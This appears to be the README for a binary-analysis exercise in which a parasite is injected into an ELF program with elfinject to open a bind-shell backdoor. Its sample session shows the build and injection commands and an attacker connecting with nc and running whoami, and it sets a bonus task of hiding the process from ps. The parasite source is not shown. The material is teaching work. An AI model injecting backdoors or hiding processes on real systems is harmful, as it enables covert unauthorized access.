# An ELF Parasite

Write your own ELF parasite and use elfinject to inject it into a program
of your choice. See whether you can make the parasite fork off a child
process that opens a backdoor. Bonus points if you can create a modiﬁed
copy of ps that doesn’t show the parasite process in the process listing.

## Solution

victim.c (acts as the host binary)
elf-parasite.s

## Bonus Solution

ps-parasite.s

## Sample Session

Victim machine:

```
$ gcc -o victim victim.c
$ nasm -f bin -o elf-parasite.bin elf-parasite.s
$ ./elfinject victim elf-parasite.bin ".parasite" 0x800000 0
$ ./victim
I'm a victim!
$ netstat -ap tcp | grep victim
tcp        0      0 *:19484    *:*    LISTEN    10662/victim 
```

Attacker machine:

```
$ nc -nv 10.0.0.33 19484
found 0 associations
found 1 connections:
     1: flags=82<CONNECTED,PREFERRED>
        outif en0
        src 10.0.0.37 port 61034
        dst 10.0.0.33 port 19484
        rank info not available
        TCP aux info available

Connection to 10.0.0.33 port 19484 [tcp/*] succeeded!
whoami
admin
exit
```
